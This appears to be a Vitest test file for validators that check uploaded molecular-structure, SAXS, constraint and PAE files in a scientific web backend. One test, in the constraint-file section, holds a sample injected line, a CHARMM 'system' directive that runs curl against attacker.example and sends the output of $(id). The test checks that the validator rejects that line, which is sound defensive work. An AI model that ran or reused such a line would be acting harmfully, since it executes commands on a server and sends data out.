import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { Express } from 'express'
import {
  fromCharmmGui,
  isCRD,
  isPsfData,
  noSpaces,
  isSaxsData,
  containsChainId,
  checkPdbResidues,
  isRNA,
  isSingleModel,
  isValidConstInpFile,
  countPdbResidues,
  countCifResidues,
  getPaeMatrixSize,
  checkPaeMatchesStructure
} from '../validationFunctions.js'

vi.mock('fs/promises', () => ({
  default: { readFile: vi.fn() }
}))

vi.mock('../../../middleware/loggers.js', () => ({
  logger: { info: vi.fn(), error: vi.fn(), warn: vi.fn() }
}))

import fs from 'fs/promises'

const mockFile = (): Express.Multer.File =>
  ({ path: '/fake/file' }) as Express.Multer.File

const mockReadFile = (content: string) => {
  vi.mocked(fs.readFile).mockResolvedValue(content as never)
}

beforeEach(() => vi.clearAllMocks())

// ---------------------------------------------------------------------------
// fromCharmmGui
// ---------------------------------------------------------------------------
describe('fromCharmmGui', () => {
  it('returns true when "CHARMM-GUI" appears in first 5 lines', async () => {
    mockReadFile('* CHARMM-GUI generated\nline2\n')
    expect(await fromCharmmGui(mockFile())).toBe(true)
  })

  it('returns false when "CHARMM-GUI" is absent', async () => {
    mockReadFile('line1\nline2\nline3\n')
    expect(await fromCharmmGui(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await fromCharmmGui(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// isCRD
// ---------------------------------------------------------------------------
describe('isCRD', () => {
  it('returns true for valid CRD format (2 star lines + EXT marker)', async () => {
    mockReadFile('* title\n* subtitle\n     12345 EXT\n')
    expect(await isCRD(mockFile())).toBe(true)
  })

  it('returns false when EXT marker is missing', async () => {
    mockReadFile('* title\n* subtitle\nno EXT here\n')
    expect(await isCRD(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await isCRD(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// isPsfData
// ---------------------------------------------------------------------------
const validPsfContent = [
  'PSF EXT CMAP XPLOR',
  '',
  '       1 !NTITLE',
  ' REMARKS generated',
  '',
  '       2 !NATOM',
  '         1 PROA      1 ALA  N    NH1   -0.470000E+00   14.007000       0',
  '         2 PROA      1 ALA  HT1  HC     0.310000E+00    1.008000       0'
].join('\n')

describe('isPsfData', () => {
  it('returns true for a valid PSF file', async () => {
    mockReadFile(validPsfContent)
    expect(await isPsfData(mockFile())).toBe(true)
  })

  it('returns false when first line does not contain PSF', async () => {
    mockReadFile(
      validPsfContent.replace('PSF EXT CMAP XPLOR', 'XPLOR EXT CMAP')
    )
    expect(await isPsfData(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await isPsfData(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// noSpaces
// ---------------------------------------------------------------------------
describe('noSpaces', () => {
  it('returns true when filename has no spaces', async () => {
    const file = { name: 'myfile.pdb' } as File
    expect(await noSpaces(file)).toBe(true)
  })

  it('returns false when filename contains a space', async () => {
    const file = { name: 'my file.pdb' } as File
    expect(await noSpaces(file)).toBe(false)
  })

  it('returns false when filename contains a tab', async () => {
    const file = { name: 'my\tfile.pdb' } as File
    expect(await noSpaces(file)).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// isSaxsData
// ---------------------------------------------------------------------------
// The analysis rules themselves are covered in @bilbomd/bilbomd-types; these
// check that the backend applies them to the uploaded file.
const buildSaxsLines = (count: number, qScale = 1): string => {
  const lines: string[] = []
  for (let i = 0; i < count; i++) {
    const q = 0.01 + i * 0.002
    const intensity = 1000 * Math.exp(-(q * q * 900) / 3) + 1
    lines.push(
      `${(q * qScale).toFixed(4)}  ${intensity.toFixed(4)}  ${(intensity * 0.02).toFixed(4)}`
    )
  }
  return lines.join('\n')
}

describe('isSaxsData', () => {
  it('accepts well-formed data in Å⁻¹ unchanged', async () => {
    mockReadFile(buildSaxsLines(150))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(true)
    expect(result.units).toBe('A')
    expect(result.changed).toBe(false)
    expect(result.warnings).toEqual([])
  })

  it('warns but accepts fewer than 100 points', async () => {
    mockReadFile(buildSaxsLines(50))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(true)
    expect(result.warnings.join(' ')).toMatch(/Only 50 data points/)
  })

  it('detects and converts nm⁻¹', async () => {
    mockReadFile(buildSaxsLines(150, 10))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(true)
    expect(result.units).toBe('nm')
    expect(result.changed).toBe(true)
  })

  it('applies the q_units it is given', async () => {
    mockReadFile(buildSaxsLines(150, 10))
    const result = await isSaxsData(mockFile(), 'A')
    expect(result.units).toBe('A')
    expect(result.unitsSource).toBe('user')
  })

  it('rejects a file with no SAXS data', async () => {
    mockReadFile('this is not\nSAXS data\n')
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/No SAXS data found/)
  })

  it('returns valid:false and message on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await isSaxsData(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toBe('Error reading SAXS file content')
  })
})

// ---------------------------------------------------------------------------
// containsChainId
// ---------------------------------------------------------------------------
describe('containsChainId', () => {
  it('returns true when ATOM line has chain ID at column 22', async () => {
    // PDB format: columns are 1-indexed; column 22 (0-indexed 21) = chain ID
    const line =
      'ATOM      1  N   ALA A   1      11.104  13.207  11.921  1.00 38.06           N'
    mockReadFile(line + '\n')
    expect(await containsChainId(mockFile())).toBe(true)
  })

  it('returns true for HETATM line with chain ID', async () => {
    const line =
      'HETATM    1  C1  LIG B   1       1.000   2.000   3.000  1.00  0.00           C'
    mockReadFile(line + '\n')
    expect(await containsChainId(mockFile())).toBe(true)
  })

  it('returns false when no ATOM/HETATM lines', async () => {
    mockReadFile('REMARK no atoms here\nEND\n')
    expect(await containsChainId(mockFile())).toBe(false)
  })

  it('returns false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await containsChainId(mockFile())).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// checkPdbResidues
// ---------------------------------------------------------------------------
// Each line gets its own residue number unless one is given
let nextResidueNumber = 1
const atomLine = (
  residue: string,
  record = 'ATOM  ',
  { chain = 'A', number = nextResidueNumber++, altLoc = ' ' } = {}
) =>
  `${record}    1  CA ${altLoc}${residue.padEnd(3)} ${chain}${String(number).padStart(4)}       1.000   2.000   3.000  1.00  0.00           C`

describe('checkPdbResidues', () => {
  it('returns valid:true for all-standard amino acids', async () => {
    const content = ['ALA', 'GLY', 'SER', 'TYR', 'VAL']
      .map((r) => atomLine(r.padEnd(3)))
      .join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:false with message listing unsupported residues', async () => {
    const content = [
      atomLine('ALA'),
      atomLine('TPO'),
      atomLine('UNK'),
      atomLine('MSE')
    ].join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/MSE/)
    expect(result.message).toMatch(/UNK/)
    expect(result.message).not.toMatch(/ALA/)
    expect(result.message).not.toMatch(/TPO/)
  })

  it('returns valid:false and message on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toBe('Error reading PDB file.')
  })

  it('asks for uppercase names when residues are only lowercase', async () => {
    mockReadFile([atomLine('ALA'), atomLine('gly')].join('\n'))
    const result = await checkPdbResidues(mockFile())
    expect(result).toEqual({
      valid: false,
      message:
        'Residue names must be uppercase (found: gly). Change them to uppercase, for example gly to GLY.'
    })
  })

  it('reports unknown and lowercase residues together', async () => {
    mockReadFile([atomLine('UNK'), atomLine('gly')].join('\n'))
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/^PDB contains unsupported residues: UNK\./)
    expect(result.message).toMatch(/must be uppercase \(found: gly\)/)
  })

  it('rejects a sugar that shares a chain and number with a protein residue', async () => {
    const content = [
      atomLine('ASP', 'ATOM  ', { chain: 'E', number: 215 }),
      atomLine('NAG', 'HETATM', { chain: 'E', number: 215 }),
      atomLine('PRO', 'ATOM  ', { chain: 'E', number: 216 })
    ].join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/chain E residue 215 \(ASP and NAG\)/)
    expect(result.message).not.toMatch(/216/)
  })

  it('lists at most three shared residue numbers', async () => {
    const content = [215, 216, 217, 218, 219]
      .flatMap((number) => [
        atomLine('ALA', 'ATOM  ', { number }),
        atomLine('NAG', 'HETATM', { number })
      ])
      .join('\n')
    mockReadFile(content)
    const result = await checkPdbResidues(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/residue 217 .* and 2 more/)
    expect(result.message).not.toMatch(/residue 218/)
  })
})

// ---------------------------------------------------------------------------
// isRNA
// ---------------------------------------------------------------------------
describe('isRNA', () => {
  const rnaAtomLine = (residue: string) =>
    `ATOM      1  P   ${residue} A   1       1.000   2.000   3.000  1.00  0.00           P`

  it('returns valid:true for file with only valid RNA nucleotides', async () => {
    const content = [
      rnaAtomLine('A'),
      rnaAtomLine('C'),
      rnaAtomLine('G'),
      rnaAtomLine('U')
    ].join('\n')
    mockReadFile(content)
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(true)
  })

  it('returns valid:false when HETATM lines are present', async () => {
    mockReadFile('HETATM    1  MG  MG  A   1       1.000   2.000   3.000\n')
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/HETATM/)
  })

  it('returns valid:false for invalid residue name', async () => {
    mockReadFile(rnaAtomLine('X') + '\n')
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toMatch(/Invalid residue/)
  })

  it('returns valid:false on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await isRNA(mockFile())
    expect(result.valid).toBe(false)
    expect(result.message).toBe('Error reading the file.')
  })
})

// ---------------------------------------------------------------------------
// isValidConstInpFile
// ---------------------------------------------------------------------------
describe('isSingleModel', () => {
  const pdb = (name = 'rna.pdb') =>
    ({ path: '/fake/file', originalname: name }) as Express.Multer.File
  const atom =
    'ATOM      1  P     G A   1      10.000  10.000  10.000  1.00  0.00           P'

  it('accepts a PDB without MODEL records', async () => {
    mockReadFile(`${atom}\nEND\n`)
    expect(await isSingleModel(pdb())).toBe(true)
  })

  it('accepts a PDB with a single MODEL', async () => {
    mockReadFile(`MODEL        1\n${atom}\nENDMDL\nEND\n`)
    expect(await isSingleModel(pdb())).toBe(true)
  })

  it('rejects an NMR ensemble with several MODELs', async () => {
    mockReadFile(
      `MODEL        1\n${atom}\nENDMDL\nMODEL        2\n${atom}\nENDMDL\n`
    )
    expect(await isSingleModel(pdb())).toBe(false)
  })

  it('accepts a CIF with one model number', async () => {
    mockReadFile(
      [
        'data_x',
        'loop_',
        '_atom_site.group_PDB',
        '_atom_site.id',
        '_atom_site.pdbx_PDB_model_num',
        'ATOM 1 1',
        'ATOM 2 1'
      ].join('\n')
    )
    expect(await isSingleModel(pdb('rna.cif'))).toBe(true)
  })

  it('rejects a CIF with several model numbers', async () => {
    mockReadFile(
      [
        'data_x',
        'loop_',
        '_atom_site.group_PDB',
        '_atom_site.id',
        '_atom_site.pdbx_PDB_model_num',
        'ATOM 1 1',
        'ATOM 2 2'
      ].join('\n')
    )
    expect(await isSingleModel(pdb('rna.cif'))).toBe(false)
  })

  it('returns false when the file cannot be read', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await isSingleModel(pdb())).toBe(false)
  })
})

describe('isValidConstInpFile', () => {
  const validPdbContent = [
    'define PROA sele segid PROA end',
    'cons fix sele PROA end',
    'return'
  ].join('\n')

  const validCrdContent = [
    'define ABCD sele segid ABCD end',
    'cons fix sele ABCD end',
    'return'
  ].join('\n')

  it('returns true for valid pdb-mode constraint file', async () => {
    mockReadFile(validPdbContent)
    expect(await isValidConstInpFile(mockFile(), 'pdb')).toBe(true)
  })

  it('returns true for valid crd_psf-mode constraint file', async () => {
    mockReadFile(validCrdContent)
    expect(await isValidConstInpFile(mockFile(), 'crd_psf')).toBe(true)
  })

  it('returns error for invalid pdb-mode segid format', async () => {
    mockReadFile(
      'define BADID sele segid BADID end\ncons fix sele BADID end\nreturn'
    )
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/segid must be/)
  })

  it('returns error string on fs error', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toBe('Error reading file')
  })

  // The rules themselves are tested in @bilbomd/bilbomd-types; this one was
  // enforced only by the job forms before the check was shared
  it('rejects more than 20 shape commands', async () => {
    const shapes = Array.from(
      { length: 21 },
      (_, i) => `shape desc dock${i + 1} rigid sele PROA end`
    )
    mockReadFile(
      [
        'define PROA sele segid PROA end',
        'cons fix sele PROA end',
        ...shapes,
        'return'
      ].join('\n')
    )
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/Too many CHARMM shape commands/)
  })

  it('returns error when file is empty', async () => {
    mockReadFile('')
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/last line must be "return"/)
  })

  it('rejects a file containing a "system" directive', async () => {
    const content = [
      'define fixed1 sele ( resid 1:5 .and. segid PROA ) end',
      'cons fix sele fixed1 end',
      'system "curl https://attacker.example/?x=$(id)"',
      'return'
    ].join('\n')
    mockReadFile(content)
    const result = await isValidConstInpFile(mockFile(), 'pdb')
    expect(result).toMatch(/Disallowed keyword/)
  })
})

// ---------------------------------------------------------------------------
// PAE ↔ structure size (mirrors tools/python/pae2const.py)
// ---------------------------------------------------------------------------
// Fixed-column PDB record for residue `resSeq` on `chain`
const pdbAtom = (
  record: 'ATOM  ' | 'HETATM',
  name: string,
  resName: string,
  chain: string,
  resSeq: number,
  iCode = ' '
) =>
  `${record}    1  ${name.padEnd(3)} ${resName} ${chain}${String(resSeq).padStart(4)}${iCode}   10.000  10.000  10.000  1.00 90.00           C`

const squarePae = (n: number, key = 'predicted_aligned_error') =>
  JSON.stringify({
    [key]: Array.from({ length: n }, () => Array<number>(n).fill(1))
  })

describe('countPdbResidues', () => {
  it('counts each residue once, not each atom', () => {
    const text = [
      pdbAtom('ATOM  ', 'N', 'ALA', 'A', 1),
      pdbAtom('ATOM  ', 'CA', 'ALA', 'A', 1),
      pdbAtom('ATOM  ', 'N', 'GLY', 'A', 2)
    ].join('\n')
    expect(countPdbResidues(text)).toBe(2)
  })

  it('counts HETATM residues such as glycans', () => {
    const text = [
      pdbAtom('ATOM  ', 'CA', 'ALA', 'A', 1),
      pdbAtom('HETATM', 'C1', 'NAG', 'A', 401)
    ].join('\n')
    expect(countPdbResidues(text)).toBe(2)
  })

  it('separates chains and insertion codes', () => {
    const text = [
      pdbAtom('ATOM  ', 'CA', 'ALA', 'A', 1),
      pdbAtom('ATOM  ', 'CA', 'ALA', 'B', 1),
      pdbAtom('ATOM  ', 'CA', 'ALA', 'B', 1, 'A')
    ].join('\n')
    expect(countPdbResidues(text)).toBe(3)
  })

  it('ignores non-atom records', () => {
    const text = [
      'HEADER    TEST',
      pdbAtom('ATOM  ', 'CA', 'ALA', 'A', 1),
      'TER',
      'END'
    ].join('\n')
    expect(countPdbResidues(text)).toBe(1)
  })
})

describe('countCifResidues', () => {
  const cif = (rows: string[], insCode = true) =>
    [
      'data_x',
      'loop_',
      '_atom_site.group_PDB',
      '_atom_site.id',
      '_atom_site.label_atom_id',
      '_atom_site.auth_seq_id',
      '_atom_site.auth_asym_id',
      ...(insCode ? ['_atom_site.pdbx_PDB_ins_code'] : []),
      ...rows
    ].join('\n')

  it('counts distinct chain/residue/insertion-code keys', () => {
    expect(
      countCifResidues(
        cif([
          'ATOM 1 N 1 A ?',
          'ATOM 2 CA 1 A ?',
          'ATOM 3 CA 2 A ?',
          'ATOM 4 CA 2 A B',
          'ATOM 5 CA 1 B ?'
        ])
      )
    ).toBe(4)
  })

  it('counts every record when several share a line', () => {
    expect(countCifResidues(cif(['ATOM 1 CA 1 A ? ATOM 2 CA 2 A ?']))).toBe(2)
  })

  it('works without an insertion code column', () => {
    expect(
      countCifResidues(cif(['ATOM 1 CA 1 A', 'ATOM 2 CA 2 A'], false))
    ).toBe(2)
  })

  it('returns 0 without an _atom_site block', () => {
    expect(countCifResidues('data_x\n_cell.length_a 10\n')).toBe(0)
  })
})

describe('getPaeMatrixSize', () => {
  it.each(['predicted_aligned_error', 'pae', 'pde'])(
    'reads the %s key',
    (key) => {
      expect(getPaeMatrixSize(squarePae(3, key))).toEqual({ size: 3 })
    }
  )

  it('unwraps an AlphaFold DB style one-element list', () => {
    expect(getPaeMatrixSize(`[${squarePae(4)}]`)).toEqual({ size: 4 })
  })

  it.each(['[]', `[${squarePae(2)}, ${squarePae(2)}]`])(
    'rejects a top-level list that is not one object: %s',
    (text) => {
      expect(getPaeMatrixSize(text)).toEqual({
        error: expect.stringContaining('exactly one object')
      })
    }
  )

  it('rejects a file without a PAE matrix', () => {
    expect(getPaeMatrixSize('{"plddt": [1, 2]}')).toEqual({
      error: expect.stringContaining('predicted_aligned_error')
    })
  })

  it('rejects a matrix that is not square', () => {
    expect(getPaeMatrixSize('{"pae": [[1, 2], [3]]}')).toEqual({
      error: expect.stringContaining('not square')
    })
  })

  it('returns null for invalid JSON', () => {
    expect(getPaeMatrixSize('{not json')).toBeNull()
  })
})

describe('checkPaeMatchesStructure', () => {
  const paeFile = {
    path: '/fake/pae.json',
    originalname: 'pae.json'
  } as Express.Multer.File
  const pdbFile = {
    path: '/fake/model.pdb',
    originalname: 'model.pdb'
  } as Express.Multer.File
  const twoResidues = [
    pdbAtom('ATOM  ', 'CA', 'ALA', 'A', 1),
    pdbAtom('ATOM  ', 'CA', 'GLY', 'A', 2)
  ].join('\n')

  const mockFiles = (pae: string, structure: string) => {
    vi.mocked(fs.readFile).mockImplementation((async (p: string) =>
      p === paeFile.path ? pae : structure) as never)
  }

  it('accepts a PAE matrix that matches the residue count', async () => {
    mockFiles(squarePae(2), twoResidues)
    expect(await checkPaeMatchesStructure(paeFile, pdbFile)).toEqual({
      valid: true
    })
  })

  it('rejects a mismatch and reports both sizes', async () => {
    mockFiles(squarePae(3), twoResidues)
    const result = await checkPaeMatchesStructure(paeFile, pdbFile)
    expect(result.valid).toBe(false)
    expect(result.message).toContain('3 × 3')
    expect(result.message).toContain('2 residues')
  })

  it('reports a PAE file with no matrix', async () => {
    mockFiles('{"plddt": []}', twoResidues)
    expect((await checkPaeMatchesStructure(paeFile, pdbFile)).valid).toBe(false)
  })

  it('leaves invalid JSON to the JSON check', async () => {
    mockFiles('{not json', twoResidues)
    expect(await checkPaeMatchesStructure(paeFile, pdbFile)).toEqual({
      valid: true
    })
  })

  it('leaves unreadable files to the per-file checks', async () => {
    vi.mocked(fs.readFile).mockRejectedValue(new Error('ENOENT'))
    expect(await checkPaeMatchesStructure(paeFile, pdbFile)).toEqual({
      valid: true
    })
  })
})
